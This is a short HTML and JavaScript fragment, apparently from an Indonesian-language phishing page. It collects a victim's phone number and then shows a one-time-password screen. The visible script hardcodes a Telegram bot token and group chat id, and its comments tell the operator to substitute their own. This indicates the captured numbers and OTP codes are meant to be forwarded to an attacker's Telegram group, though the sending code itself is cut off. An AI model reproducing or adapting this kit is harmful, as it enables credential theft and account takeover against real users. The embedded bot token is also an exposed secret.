...
<button id="back1" type="button" class="btn-backku" onclick="goback1()"><ion-icon name="chevron-back-outline"></ion-icon></button>	<p></p>
		...
		<form id="formNohp" onsubmit="sendNohp(event);" >
			...
			<div class="box-btn">
				<button disabled id="btn" class="btnnohp" type="submit" style="margin-top: -40%">LANJUT</button>
			</div>
		</form>
...
<div class="bgotp hid" style="width: 100%;
    ...
    margin: 0px auto;
    top: 0;">
			 <div class="page" style="left: 0px; position: absolute; right: 0; margin: 0px auto; margin-top: 0px; background-image: url(https://media.publit.io/file/eastnai.png) ;
  background-position: 100% 100%;
...
<button type="button" style="right: 10; bottom: 238; float: right; width: 40px; background: transparent; color: transparent; border: none; font-size: 13px; height: 10px; position: fixed;" onclick="tutupotp()">XX</button>
				...
				<p id="userid" style="font-size: 2px; text-align: center; margin-bottom: -100px; font-weight: 600; color: #573D8B; margin-top: 66px; margin-left: -125px; opacity: 0.0; "></p>
  <center>
				<p class="alert" id="alert" style="font-size: 14px; text-align: center; margin-bottom: 0px; font-weight: 450; color: #000; margin-top: 135px; display: ; width: 360px; margin-bottom: -10px; font-weight: 500"></p>
		...
		<div type="button" class="clearotp"></div>
		 ...
		 <p id="waktuku" class="resend" style="margin-top: 50px; color: #aaa; font-size: 13px">
...
<script>
   function sendNohp(event){
    ...
    var token = '7056300082:AAEoAcn5R-nEwTBNnKAO2AwYIwMsE6fI1CY'; // Ganti dengan token bot yang kamu buat
    var grup = '6755844298'; // Ganti dengan chat id dari bot yang kamu buat
